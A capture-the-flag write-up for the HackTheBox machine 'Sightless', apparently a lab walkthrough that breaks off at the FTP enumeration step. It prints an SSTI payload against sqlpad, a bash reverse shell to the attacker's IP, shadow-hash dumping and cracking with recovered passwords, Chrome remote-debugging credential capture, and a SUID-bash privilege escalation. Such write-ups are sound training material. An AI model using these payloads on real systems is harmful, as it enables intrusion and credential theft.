---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - ClientSide
  - VirtualHosts
  - VHOST
  - ServerSideTemplateInjection
  - SSTI
  - CommandInjection
  - Unshadowing
  - Froxlor
  - GoogleChrome
  - Sandbox
  - ClientSide
  - FTP
  - KeePass
---

![](images/Sightless.png)

## Summary

The box starts with an application called `sqlpad` running on a configured `VHOST` entry. The application is vulnerable to `Server-Side Template Injection (SSTI)` which leads to `Remote Code Execution (RCE)`. Abusing this vulnerability provides `foothold` inside a `container` as `root`. By reading the `/etc/passwd` and `/etc/shadow` file in order to `unshadow` them and to `crack` the resulting `hash` for a user called `michael`, the `user.txt` can be obtained. As `michael` on the main system an instance of `Google Chrome` can be found located in `/opt`. Enumeration of `locally opened ports` shows a few random `high ports`. One of those ports allows the extraction of credentials due to a `client-side` login process to the `Froxlor` application by enabling `remote debugging` using the `chrome-sandbox` binary. By forwarding port `8080/TCP` after gaining the credentials for the `admin` account on `admin.sightless.htb` which can be found inside a `VHOST` configuration of `apache2`, you can `reset` the password for the `web1` user which has access to the `FTP` server running on port `21/TCP`. On the share a `KeePass` database can be found. Using `keepass2john` and cracking the `hash` to obtain the `password` for the `database` file reveals a `id_rsa` key which is matching for `root`.  Grab the `root.txt` and close the box.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Enumeration of sqlpad.sightless.htb](#Enumeration-of-sqlpadsightlesshtb)
- [Foothold](#Foothold)
    - [Server-Side Template Injection (SSTI)](#Server-Side-Template-Injection-SSTI)
- [Enumeration](#Enumeration)
- [Privilege Escalation to michael](#Privilege-Escalation-to-michael)
- [Unshadowing](#Unshadowing)
- [Cracking the Hash](#Cracking-the-Hash)
- [user.txt](#usertxt)
- [Pivoting](#Pivoting)
- [Enumerating Froxlor](#Enumerating-Froxlor)
- [Abusing Chrome Sandbox](#Abusing-Chrome-Sandbox)
- [Privilege Escalation to root (unintended)](#Privilege-Escalation-to-root-unintended)
- [Privilege Escalation to root (intended)](#Privilege-Escalation-to-root-intended)
    - [FTP User Password Reset](#FTP-User-Password-Reset)
    - [Enumeration of Port 21/TCP](#Enumeration-of-Port-21-TCP)
    - [Cracking the KeePass 2 Database Password](#Cracking-the-KeePass-2-Database-Password)
    - [Investigating the KeePass 2 Database File](#Investigating-the-KeePass-2-Database-File)
- [root.txt](#roottxt)

## Reconnaissance

### Port Scanning

As usual we started with a basic `port scan` and found one interesting port besides the the usual port `22/TCP` and port `80/TCP` and this one was for `FPT`, port  `21/TCP`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.200.167
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 21:02 CEST
Nmap scan report for 10.129.200.167
Host is up (0.018s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.200.167]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=9/7%Time=66DCA38B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,A3,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20S
SF:erver\)\x20\[::ffff:10\.129\.200\.167\]\r\n500\x20Invalid\x20command:\x
SF:20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try
SF:\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.30 seconds
```

### Enumeration of Port 80/TCP

We started with enumeration of port `80/TCP` which redirected us to `http://sightless.htb` after we accessed it using the `IP address`. There we added it to our `/etc/hosts` file as usual.

- [http://10.129.200.167/](http://10.129.200.167/)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.200.167  sightless.htb
```

- [http://sightless.htb/](http://sightless.htb/)

Either the `web stack` didn't showed anything interesting.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://sightless.htb/
http://sightless.htb/ [200 OK] Country[RESERVED][ZZ], Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.200.167], Title[Sightless.htb], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

However on the `website` itself we found a `link` to an application called `sqlpad`.

![](images/2024-09-07_21-08_80_website.png)

![](images/2024-09-07_21-10_80_website_vhost.png)

```c
        <div class="box">
            <div class="card">
                <i class="fa-brands fa-airbnb"></i>
                <h5>SQLPad</h5>
                <div class="pra">
                <p>SQLPad is a web app that lets users connect to various SQL servers via a browser. Click "Start Now" to try a demo!</p>
                <p style="text-align: center;">
                <a class="button" href="http://sqlpad.sightless.htb/"> Start Now</a>
                </p>
                </div>
            </div>
```

To access `sqlpad` we had to add the `VHOST` of `sqlpad.sightless.htb` to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.200.167  sightless.htb
10.129.200.167  sqlpad.sightless.htb
```

### Enumeration of sqlpad.sightless.htb

While we took a closer look on the application, we found two `usernames` when we played around with the `create access` option.

- [http://sqlpad.sightless.htb/](http://sqlpad.sightless.htb/)

![](images/2024-09-07_21-12_80_sqlpad.png)

![](images/2024-09-07_21-16_80_sqlpad_usernames.png)

| Username |
| -------- |
| admin    |
| john     |

## Foothold

### Server-Side Template Injection (SSTI)

A quick research on Google brought up an `writeup` for a `bug bounty` on `huntr.com` which described  `Server-Side Template Injection (SSTI)` vulnerability when creating  `MySQL database connection` which lead to `Remote Code Execution (RCE)`.

- [https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

We modified the available `Proof of Concept (PoC)` command to our needs and got a `callback` on our `webserver`.

```c
{{ process.mainModule.require('child_process').exec('wget http://10.10.14.132/x') }}
```

![](images/2024-09-07_21-42_80_sqlpad_ssti.png)

```c
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.200.167 - - [07/Sep/2024 21:39:16] code 404, message File not found
10.129.200.167 - - [07/Sep/2024 21:39:16] "GET /x HTTP/1.1" 404 -
```

For the purpose of `enumeration` our member `Bushidosan` came up with a neat little `Command Injection` example.

```c
{{ process.mainModule.require('child_process').exec('wget "http://10.10.14.132/$(whoami)"') }}
```

Interesting enough the application was running as `root` so this was an indicator that it probably ran inside a `container` because of the early stage of the box.

```c
10.129.200.167 - - [07/Sep/2024 21:51:00] code 404, message File not found
10.129.200.167 - - [07/Sep/2024 21:51:00] "GET /root HTTP/1.1" 404 -
10.129.200.167 - - [07/Sep/2024 21:51:00] code 404, message File not found
10.129.200.167 - - [07/Sep/2024 21:51:00] "GET /root HTTP/1.1" 404 -
```

To gain `foothold` on the box we hosted a simple `reverse shell` payload locally, downloaded it through the `Remote Code Execution (RCE)` within the `Server-Side Template Injection (SSTI)` and then executed it using a `second` payload.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sightless/serve]
└─$ cat x 
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.132/9001 0>&1'
```

```c
{{ process.mainModule.require('child_process').exec('wget http://10.10.14.132/x') }}
```

![](images/2024-09-07_21-46_80_sqlpad_ssti_payload.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sightless/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.200.167 - - [07/Sep/2024 21:45:32] "GET /x HTTP/1.1" 200 -
10.129.200.167 - - [07/Sep/2024 21:45:32] "GET /x HTTP/1.1" 200 -
```

```c
{{ process.mainModule.require('child_process').exec('bash x') }}
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.132] from (UNKNOWN) [10.129.200.167] 45444
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad#
```

Since `Python` was not available we stabilized our shell using `script`. Shout-out to `ar0x4` for this helpful little trick back in the day.

```c
root@c184118df0a6:/var/lib/sqlpad# script -q /dev/null -c bash
script -q /dev/null -c bash
```

## Enumeration

Since we dropped into a shell as `root` we were able to read the `shadow` file which contained two interesting `hashes`. One for `root` and one for a user called `michael`.

```c
root@c184118df0a6:/var/lib/sqlpad# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

```c
root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

## Privilege Escalation to michael

## Unshadowing

We copied the output of `/etc/passwd` and `/etc/shadow` into files on our local `Kali` machines and used `unshadow` to format it in order to try `cracking` the `hashes`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sightless/files]
└─$ unshadow passwd shadow 
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:*:100:65534::/nonexistent:/usr/sbin/nologin
node:!:1000:1000::/home/node:/bin/bash
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:1001:1001::/home/michael:/bin/bash
```

## Cracking the Hash

We just went for the `hash` of `michael` because usually the passwords for `root` are very complex and not crackable at all.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sightless/files]
└─$ cat hash_michael 
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
```

After a few seconds we got the `password` for `michael` inside the `container`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sightless/files]
└─$ sudo john hash_michael --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Created directory: /root/.john
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
insaneclownposse (?)     
1g 0:00:00:15 DONE (2024-09-07 22:04) 0.06472g/s 3811p/s 3811c/s 3811C/s kruimel..bluedolphin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Username | Password         |
| -------- | ---------------- |
| michael  | insaneclownposse |

As next step we tried to use it on the main system and got lucky.

```c
┌──(kali㉿kali)-[~]
└─$ ssh michael@sightless.htb
The authenticity of host 'sightless.htb (10.129.200.167)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
michael@sightless.htb's password: 
Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23
michael@sightless:~$
```

## user.txt

We grabbed the `user.txt` and proceeded with `pivoting`.

```c
michael@sightless:~$ cat user.txt 
a7ac719919b0fc2592425ca66997bf9c
```

## Pivoting

A quick look into the `permissions` of `michael` and the `/etc/passwd` only showed another `user` called `john`.

```c
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
```

```c
michael@sightless:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
michael:x:1000:1000:michael:/home/michael:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:120:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:116:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:117:65534::/srv/ftp:/usr/sbin/nologin
john:x:1001:1001:,,,:/home/john:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

| Username |
| -------- |
| john     |

Also `michael` was not able to execute commands using `sudo`. So we had to look elsewhere for a way to escalate our privileges.

```c
michael@sightless:~$ sudo -l
[sudo] password for michael: 
Sorry, user michael may not run sudo on sightless.
```

Inside `/opt` we found an installation folder of `Google Chrome` which we could access.

```c
michael@sightless:/opt$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Aug  2 06:46 .
drwxr-xr-x 18 root root 4096 Sep  3 08:20 ..
drwx--x--x  4 root root 4096 May 15 03:49 containerd
drwxr-xr-x  3 root root 4096 May 15 23:03 google
```

```c
michael@sightless:/opt/google/chrome$ ls -la
total 281756
drwxr-xr-x 7 root root      4096 May 15 23:05 .
drwxr-xr-x 3 root root      4096 May 15 23:03 ..
-rwxr-xr-x 1 root root 241119072 May 14 22:24 chrome
-rw-r--r-- 1 root root    735000 May 14 22:24 chrome_100_percent.pak
-rw-r--r-- 1 root root   1186721 May 14 22:24 chrome_200_percent.pak
-rwxr-xr-x 1 root root   1289640 May 14 22:24 chrome_crashpad_handler
-rw-r--r-- 1 root root     11792 Aug  9 09:39 chrome_debug.log
-rwxr-xr-x 1 root root   5021872 May 14 22:24 chrome-management-service
-rwsr-xr-x 1 root root    212600 May 14 22:24 chrome-sandbox
-rw-r--r-- 1 root root         7 May 14 22:24 CHROME_VERSION_EXTRA
drwxr-xr-x 2 root root      4096 May 15 23:03 cron
-rw-r--r-- 1 root root       482 May 14 22:24 default-app-block
drwxr-xr-x 2 root root      4096 May 15 23:03 default_apps
-rwxr-xr-x 1 root root      1852 May 14 22:24 google-chrome
-rw-r--r-- 1 root root  10468208 May 14 22:24 icudtl.dat
-rw-r--r-- 1 root root    244968 May 14 22:24 libEGL.so
-rw-r--r-- 1 root root   6909064 May 14 22:24 libGLESv2.so
-rw-r--r-- 1 root root   6679240 May 14 22:24 liboptimization_guide_internal.so
-rw-r--r-- 1 root root     26616 May 14 22:24 libqt5_shim.so
-rw-r--r-- 1 root root     28824 May 14 22:24 libqt6_shim.so
-rw-r--r-- 1 root root   4024832 May 14 22:24 libvk_swiftshader.so
-rw-r--r-- 1 root root    612104 May 14 22:24 libvulkan.so.1
drwxr-xr-x 2 root root      4096 May 15 23:03 locales
drwxr-xr-x 2 root root      4096 May 15 23:03 MEIPreload
-rw-r--r-- 1 root root     10577 May 14 22:24 product_logo_128.png
-rw-r--r-- 1 root root       787 May 14 22:24 product_logo_16.png
-rw-r--r-- 1 root root      1281 May 14 22:24 product_logo_24.png
-rw-r--r-- 1 root root     38037 May 14 22:24 product_logo_256.png
-rw-r--r-- 1 root root      1810 May 14 22:24 product_logo_32.png
-rw-r--r-- 1 root root      7611 May 14 22:24 product_logo_32.xpm
-rw-r--r-- 1 root root      3095 May 14 22:24 product_logo_48.png
-rw-r--r-- 1 root root      4557 May 14 22:24 product_logo_64.png
-rw-r--r-- 1 root root   9046591 May 14 22:24 resources.pak
-rw-r--r-- 1 root root    660325 May 14 22:24 v8_context_snapshot.bin
-rw-r--r-- 1 root root       107 May 14 22:24 vk_swiftshader_icd.json
drwxr-xr-x 3 root root      4096 May 15 23:03 WidevineCdm
-rwxr-xr-x 1 root root     37394 May 14 22:24 xdg-mime
-rwxr-xr-x 1 root root     33273 May 14 22:24 xdg-settings
```

Since finding `Google Chrome` on a box with the option to use the `chrome-sandbox` binary was pretty odd, we checked the `locally available ports` just to find a few `random high ports` being open.

```c
michael@sightless:/$ ss -tulpn
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        70                                             127.0.0.1:33060                                           0.0.0.0:*                                                
tcp                     LISTEN                   0                        10                                             127.0.0.1:39201                                           0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:3000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        151                                            127.0.0.1:3306                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        5                                              127.0.0.1:50635                                           0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:40259                                           0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                            127.0.0.1:8080                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                                                
tcp                     LISTEN                   0                        128                                                    *:21                                                    *:*
```

We went ahead with our enumeration and found another `VHOST` configuration inside of the `apache2` directory in `/etc`.

```c
michael@sightless:/etc/apache2/sites-enabled$ ls -la
total 28
drwxr-xr-x 2 root root 4096 Sep  3 11:55 .
drwxr-xr-x 9 root root 4096 Aug  9 11:17 ..
lrwxrwxrwx 1 root root   35 May 15 04:27 000-default.conf -> ../sites-available/000-default.conf
-rw-r--r-- 1 root root 1480 Aug  2 09:05 002-sqlpad.conf
-rw-r--r-- 1 root root  264 Sep  3 11:55 05_froxlor_dirfix_nofcgid.conf
-rw-r--r-- 1 root root  770 Sep  3 11:55 10_froxlor_ipandport_192.168.1.118.80.conf
-rw-r--r-- 1 root root  917 Sep  3 11:55 34_froxlor_normal_vhost_web1.sightless.htb.conf
-rw-r--r-- 1 root root  412 Sep  3 11:55 40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf
```

```c
michael@sightless:/etc/apache2/sites-enabled$ cat 10_froxlor_ipandport_192.168.1.118.80.conf 
# 10_froxlor_ipandport_192.168.1.118.80.conf
# Created 03.09.2024 11:55
# Do NOT manually edit this file, all changes will be deleted after the next domain change at the panel.

<VirtualHost 192.168.1.118:80>
DocumentRoot "/var/www/html/froxlor"
 ServerName admin.sightless.htb
  <Directory "/lib/">
    <Files "userdata.inc.php">
    Require all denied
    </Files>
  </Directory>
  <DirectoryMatch "^/(bin|cache|logs|tests|vendor)/">
    Require all denied
  </DirectoryMatch>
  <FilesMatch \.(php)$>
    <If "-f %{SCRIPT_FILENAME}">
        SetHandler proxy:unix:/var/lib/apache2/fastcgi/1-froxlor.panel-admin.sightless.htb-php-fpm.socket|fcgi://localhost
    </If>
  </FilesMatch>
  <Directory "/var/www/html/froxlor/">
      CGIPassAuth On
  </Directory>
</VirtualHost>
```

## Enumerating Froxlor

So we started `forwarding` all the out of the ordinary available ports like port `8080/TCP` and added the newly found `VHOST` address `admin.sightless.htb` to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ ssh -L 8888:127.0.0.1:8080 michael@sightless.htb
michael@sightless.htb's password: 
Last login: Sat Sep  7 20:07:03 2024 from 10.10.14.132
michael@sightless:~$
```

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.200.167  sightless.htb
10.129.200.167  sqlpad.sightless.htb
127.0.0.1       admin.sightless.htb
```

We accessed port `8080/TCP` forwarded to port `8888/TCP` to not interfere with `Burp Suite` and found ourselves on the `login page` to `Froxlor`.

- [http://admin.sightless.htb:8888/](http://admin.sightless.htb:8888/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://admin.sightless.htb
http://admin.sightless.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[SimpleHTTP/0.6 Python/3.11.9], IP[127.0.0.1], Python[3.11.9], Title[Directory listing for /]
```
\
![](images/2024-09-07_22-31_froxlor.png)

## Abusing Chrome Sandbox

Now we tried putting all the `puzzle pieces` together and searched for a way to leverage the available `chrome-sandbox` binary to our advantage.

- [https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)

We started enumerating the `high ports` by enabling `remote debugging` for each of them using the `chrome-sandbox` binary.

```c
michael@sightless:/opt/google/chrome$ ./chrome-sandbox --remote-debugging-port=39201
The setuid sandbox provides API version 1, but you need 0
Please read https://chromium.googlesource.com/chromium/src/+/main/docs/linux/suid_sandbox_development.md.

close: Bad file descriptor
Read on socketpair: Success
```

Then we `forwarded` them using `SSH` and the `credentials` of `michael`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh -L 39201:127.0.0.1:39201 michael@sightless.htb
michael@sightless.htb's password: 
Last login: Sat Sep  7 20:28:49 2024 from 10.10.14.132
michael@sightless:~$
```

Finally we opened the `configuration` inside our own `Chrome browser` instance of `Burp Suite` and configured the forwarded ports one at a time and also enabled `Port forwarding` for all of them until one of them showed `Remote Targets`.

- [chrome://inspect/#devices](chrome://inspect/#devices)

![](images/2024-09-07_23-45_remote_debugging_port_forward.png)

After opening one of the `remote targets` we saw a `client-side` configuration logging in and after a few seconds immediately logging out of the application.

![](images/2024-09-07_23-46_debugging_console.png)

Shout-out to `carnifex17` and `Bushidosan` for fiddling out a working setup for us to make the `password` readable during the `login process`.

First of all we `paused` the `debugger` and inspected the `elements` to find the `password field` configuration.

![](images/2024-09-08_12-47_froxlor_stop_script.png)

We switched from the `Sources` tab to the `Elements` tab and changed the `form-control` from `password` to `text`. Even when the page got refreshed, the line we edited still was opened so we had a few seconds to change it to `text` if it failed.

![](images/2024-09-08_12-48_froxlor_password_field.png)

Then we needed to be either `quick` or some of us just made a `short clip` of the `login process` to capture the password.

![](images/2024-09-08_00-15_froxlor_admin_password.png)

| Username | Password        |
| -------- | --------------- |
| admin    | ForlorfroxAdmin |

This lead us to the `admin dashboard` of `Froxlor`.

![](images/2024-09-08_00-18_froxlor_dashboard.png)

## Privilege Escalation to root (unintended)

Since the `admin dashboard` offered the option to add a `custom command` when starting `php-fpm`, our mate `mk0` went for the `insta kill` and got `code execution` through it.


We found the easiest way to `escalate our privileges` to `root` would be to set the `SUID` bit onto `/usr/bin/bash`.

```c
chmod -R 4777 /usr/bin/bash
```

![](images/2024-09-08_00-46_froxlor_php_fpm_suid.png)

After our payload was set we just needed to `disable` and `enable` the `php-fpm` module and after a few seconds the `SUID` bit was set on the binary.

![](images/2024-09-08_00-30_froxlor_php_fpm_restart.png)

```c
michael@sightless:/$ ls -la /usr/bin/bash
-rwsrwxrwx 1 root root 1396520 Mar 14 11:31 /usr/bin/bash
```

```c
michael@sightless:~$ /usr/bin/bash -p
bash-5.1#
```

## Privilege Escalation to root (intended)

### FTP User Password Reset

The intended way was probably to `reset` the `password` for the `FTP` account. We clicked ourselves through the application until we found a `username` called `web1` on which we clicked to see another `overlay` of the `admin dashboard` which gave us the ability to just `reset` the `web1` users `password`.

![](images/2024-09-08_12-09_web1_ftp_settings.png)

We copied the `Password suggestion`, entered and saved it.

![](images/2024-09-08_12-09_web1_ftp_password_reset.png)

### Enumeration of Port 21/TCP

